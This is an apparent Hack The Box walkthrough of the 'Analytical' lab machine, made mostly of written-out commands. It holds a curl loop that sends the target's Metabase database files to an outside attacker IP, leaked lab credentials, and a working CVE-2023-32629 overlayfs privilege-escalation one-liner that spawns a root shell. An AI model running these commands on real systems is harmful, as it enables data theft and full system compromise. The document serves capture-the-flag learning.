# Hack The Box - Easy - Analytical

## Enumeration

- Command: sudo nmap analytical.htb -sT -sV -sC -p- -O -oN nmap-tcp-scan.txt

- Command: gobuster dir -url http://analytical.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-dir-scan.txt 2>/dev/null

- Command: gobuster vhost -u http://analytical.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o gobuster-subdomain-scan --append-domain

- Command: sudo nmap analytical.htb -sU -sV -sC --top-ports 1000 -oN nmap-udp-scan.txt

## Initial Shell

- Command ( HOST ): msfconsole

- Command ( HOST ): search linux/http/metabase_setup_token_rce

- User: metabase

- Command ( TARGET ): for file in ./metabase.db/\*; do curl -F "files=@$file" http://10.10.16.144:8000/upload; done

- Command ( TARGET ): env

- Meta User: metalytics

- Meta Password: An4lytics_ds20223#

## User Flag

- Answer: 8dc321eab0a9a0b91ef80aa938d66a56

## Privilage Escalation

- Command: cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
metalytics:x:1000:1000:,,,:/home/metalytics:/bin/bash
\_laurel:x:998:998::/var/log/laurel:/bin/false

- Command: cat /etc/os-release

PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

- Command: uname -a

Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

https://nvd.nist.gov/vuln/detail/cve-2023-32629

## Root Flag

- Command ( TARGET ): cd /tmp

- Command ( TARGET ): cd /tmp && rm -rf l u w m

- Command ( TARGET ): unshare -rm sh -c "mkdir l u w m && cp /usr/bin/python3 l/ && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*"

- Command ( TARGET ): ./u/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

- Answer: e3823858f870159fa811d00f5ded8376
